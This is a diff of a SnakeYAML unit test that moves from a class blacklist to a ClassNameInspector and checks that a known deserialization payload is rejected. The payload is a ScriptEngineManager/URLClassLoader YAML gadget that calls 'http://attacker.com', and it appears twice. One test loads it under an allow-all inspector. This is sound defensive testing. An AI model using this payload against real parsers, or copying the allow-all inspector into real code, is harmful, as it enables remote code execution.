@@ -13,24 +13,22 @@
  */
 package org.yaml.snakeyaml.issues.issue564;
 
-import static org.junit.Assert.assertEquals;
+import org.junit.Test;
+import org.yaml.snakeyaml.LoaderOptions;
+import org.yaml.snakeyaml.Yaml;
+import org.yaml.snakeyaml.constructor.ClassNameInspector;
+
 import static org.junit.Assert.assertNotNull;
 import static org.junit.Assert.assertTrue;
 import static org.junit.Assert.fail;
 
-import java.util.ArrayList;
-import java.util.List;
-import org.junit.Test;
-import org.yaml.snakeyaml.LoaderOptions;
-import org.yaml.snakeyaml.Yaml;
-
-public class BlackListTest {
+public class ClassNameInspectorTest {
 
   /**
    * https://securitylab.github.com/research/swagger-yaml-parser-vulnerability/
    */
   @Test
-  public void testBlackListScriptEngineManager() {
+  public void testDenyScriptEngineManager() {
     try {
       String malicious = "!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader "
           + "[[!!java.net.URL [\"http://attacker.com\"]]]]";
@@ -39,14 +37,21 @@ public class BlackListTest {
 
       fail("ScriptEngineManager should not be accepted");
     } catch (Exception e) {
-      assertTrue(e.getMessage().startsWith("Class is blacklisted."));
+      assertTrue(e.getMessage(),
+          e.getMessage().startsWith("Class is not allowed: javax.script.ScriptEngineManager"));
     }
   }
 
   @Test
-  public void testWhiteListScriptEngineManager() {
+  public void testAllowScriptEngineManager() {
     LoaderOptions options = new LoaderOptions();
-    options.setBlackListClasses(new ArrayList<Class>());
+    options.setClassNameInspector(new ClassNameInspector() {
+
+      @Override
+      public boolean isAllowed(Class fullClassName) {
+        return true;
+      }
+    });
 
     String malicious = "!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader "
         + "[[!!java.net.URL [\"http://attacker.com\"]]]]";
@@ -54,23 +59,5 @@ public class BlackListTest {
     // called.
     Object obj = yaml.load(malicious); // Make request to http://attacker.com
     assertNotNull(obj);
-  }
-
-  @Test
-  public void testBlackListIsImmutable() {
-    LoaderOptions options = new LoaderOptions();
-    List<Class> black = options.getBlackListClasses();
-    try {
-      black.add(this.getClass());
-      fail("No way to modify the black list.");
-    } catch (UnsupportedOperationException e) {
-      //
-    }
-  }
-
-  @Test
-  public void testDefaultBlackListSize() {
-    LoaderOptions options = new LoaderOptions();
-    assertEquals(4, options.getBlackListClasses().size());
   }
 }
